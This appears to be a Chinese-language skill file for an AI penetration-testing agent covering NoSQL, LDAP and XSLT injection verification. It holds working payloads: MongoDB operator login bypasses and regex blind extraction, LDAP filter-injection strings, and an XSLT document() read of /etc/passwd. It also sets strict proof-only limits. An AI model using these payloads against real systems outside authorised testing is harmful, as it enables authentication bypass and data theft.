---
name: nosql-ldap-xslt-injection
description: 【验证】非 SQL 注入家族：NoSQL（MongoDB 操作符注入）、LDAP（过滤器注入）、XSLT（处理器注入）三种判定与利用边界，含各家的"能证明存在"的最小手法
whenToUse: 目标是 MongoDB/Solr/ES 后端、LDAP 目录（AD/OpenLDAP）、或 XML/XSLT 处理入口，且 SQL 注入无果时
role: exploit
category: 验证
tags: [nosql, mongodb, ldap, xslt, injection, 注入]
enabled: true
---

# 非 SQL 注入家族

> 三种共同点：**参数进入了一个有语法的解释器**。
> 判定思路一致：构造语法错误的输入，看报错/行为差异。

## 一、NoSQL 注入（MongoDB 为主）

### 识别
- 参数是 JSON（`{"username":"admin","password":"x"}`）
- 报错含 `MongoError`、`topology`、`BSON`
- 登录接口对 `{"$ne":null}` 类输入有不同反应

### 经典 payload（登录绕过）

```json
{"username":"admin","password":{"$ne":null}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$regex":"^a"}}
```

**判据**：登录成功（拿到会话）或用 `$regex` 逐字符推出密码。

### 盲注（无回显时）
```json
{"username":"admin","password":{"$regex":"^a"}}   // 真
{"username":"admin","password":{"$regex":"^z"}}   // 假
```
**判据**：两种输入响应不同（页面/状态/耗时）→ 可逐字符提取。

### 参数污染的坑
有些框架会把 `a[$ne]=1` 形式的 query 参数转成对象：
```
?username=admin&password[$ne]=1
```
**先试这个，成本最低。**

## 二、LDAP 注入

### 识别
- 登录/查询接口对接 AD/OpenLDAP
- 报错含 `LDAP`、`javax.naming`、`invalid DN`

### payload

| 目的 | payload |
|---|---|
| 绕过认证 | `*` 作为用户名，任意密码 |
| 通配 | `admin*` |
| 逻辑注入 | `*)(uid=*))(|(uid=*` |
| 属性枚举 | `*)(objectClass=*` |

**判据**：`*` 能登录进去，或返回异常多的条目。

## 三、XSLT 注入

### 识别
- 接口接收 XML 且返回转换结果
- 报错含 `XSLT`、`TransformerException`、`xsl:`

### payload（先证明能执行表达式）
```xml
<xsl:value-of select="7*7"/>
```
**判据**：返回 `49`。

### 升级边界
XSLT 可调 `document()` 读文件或发请求（取决于处理器）：
```xml
<xsl:value-of select="document('file:///etc/passwd')"/>
```
**只证明读到文件的前几十字符即停。**

## 四、判定标准

| 结果 | 结论 |
|---|---|
| NoSQL 操作符绕过登录 | ✅ 高（认证绕过） |
| NoSQL 盲注可逐字符提取 | ✅ 中高 |
| LDAP `*` 绕过认证 | ✅ 高 |
| XSLT 可执行表达式并读文件 | ✅ 中高 |
| 只有报错含库名 | ❌ 不算 |

## 五、证据要求

1. 正常请求 + 注入请求 + 响应对比
2. 盲注：真/假两种输入的差异（可重复）
3. 只取**必要的 1–2 条**证明，不批量提取

## 六、失败判据

- 参数被强类型转换（如强制 string）→ 放弃
- 报错被统一吞掉且无行为差异 → 放弃
- XSLT 处理器禁用了 `document()` 且无法绕 → 放弃

## 七、边界

- **不批量拖数据**：盲注只提取 1–2 个字符证明可行
- 不用 XSLT 执行系统命令
- LDAP 只证明"能绕过认证"，不枚举整个目录

## 八、常见坑

| 坑 | 说明 |
|---|---|
| 用 SQL 思路测 NoSQL | 语法完全不同，`'or 1=1--` 无效 |
| 忽略 query 参数形式 | `password[$ne]=1` 比 JSON 更容易生效 |
| LDAP 里 `*` 被转义 | 试 `*)(` 组合 |
| XSLT 把 `7*7` 原样回显 | 说明没执行，不是注入 |
